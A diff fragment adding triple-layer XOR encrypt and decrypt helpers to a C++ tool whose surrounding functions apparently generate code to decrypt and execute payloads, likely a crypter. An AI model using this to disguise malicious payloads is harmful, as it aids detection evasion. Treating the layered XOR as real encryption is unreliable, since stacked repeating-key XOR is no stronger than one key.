@@ -406,6 +406,97 @@ void executeDecryptedPayload() {
 )";
     }
 
+    // Triple-layer XOR encryption (inspired by test_embedded_final.cpp)
+    std::vector<uint8_t> tripleXorEncrypt(const std::vector<uint8_t>& data) {
+        // Generate three random keys
+        std::vector<uint8_t> key1(16), key2(32), key3(25);
+        
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<> dist(0, 255);
+        
+        for (auto& k : key1) k = dist(gen);
+        for (auto& k : key2) k = dist(gen);
+        for (auto& k : key3) k = dist(gen);
+        
+        // Encrypt with triple XOR
+        std::vector<uint8_t> result = data;
+        
+        // Layer 1: XOR with key1
+        for (size_t i = 0; i < result.size(); i++) {
+            result[i] ^= key1[i % key1.size()];
+        }
+        
+        // Layer 2: XOR with key2
+        for (size_t i = 0; i < result.size(); i++) {
+            result[i] ^= key2[i % key2.size()];
+        }
+        
+        // Layer 3: XOR with key3
+        for (size_t i = 0; i < result.size(); i++) {
+            result[i] ^= key3[i % key3.size()];
+        }
+        
+        // Prepend keys to the encrypted data
+        std::vector<uint8_t> finalResult;
+        finalResult.push_back(key1.size());
+        finalResult.insert(finalResult.end(), key1.begin(), key1.end());
+        finalResult.push_back(key2.size());
+        finalResult.insert(finalResult.end(), key2.begin(), key2.end());
+        finalResult.push_back(key3.size());
+        finalResult.insert(finalResult.end(), key3.begin(), key3.end());
+        finalResult.insert(finalResult.end(), result.begin(), result.end());
+        
+        return finalResult;
+    }
+    
+    std::vector<uint8_t> tripleXorDecrypt(const std::vector<uint8_t>& data) {
+        if (data.size() < 3) return {};
+        
+        size_t pos = 0;
+        
+        // Extract key1
+        uint8_t key1Size = data[pos++];
+        if (pos + key1Size > data.size()) return {};
+        std::vector<uint8_t> key1(data.begin() + pos, data.begin() + pos + key1Size);
+        pos += key1Size;
+        
+        // Extract key2
+        if (pos >= data.size()) return {};
+        uint8_t key2Size = data[pos++];
+        if (pos + key2Size > data.size()) return {};
+        std::vector<uint8_t> key2(data.begin() + pos, data.begin() + pos + key2Size);
+        pos += key2Size;
+        
+        // Extract key3
+        if (pos >= data.size()) return {};
+        uint8_t key3Size = data[pos++];
+        if (pos + key3Size > data.size()) return {};
+        std::vector<uint8_t> key3(data.begin() + pos, data.begin() + pos + key3Size);
+        pos += key3Size;
+        
+        // Extract encrypted data
+        std::vector<uint8_t> result(data.begin() + pos, data.end());
+        
+        // Decrypt in reverse order
+        // Layer 3: XOR with key3
+        for (size_t i = 0; i < result.size(); i++) {
+            result[i] ^= key3[i % key3.size()];
+        }
+        
+        // Layer 2: XOR with key2
+        for (size_t i = 0; i < result.size(); i++) {
+            result[i] ^= key2[i % key2.size()];
+        }
+        
+        // Layer 1: XOR with key1
+        for (size_t i = 0; i < result.size(); i++) {
+            result[i] ^= key1[i % key1.size()];
+        }
+        
+        return result;
+    }
+
     std::string generateChaCha20DecryptionCode() {
         return R"(
 std::vector<uint8_t> chacha20Decrypt() {
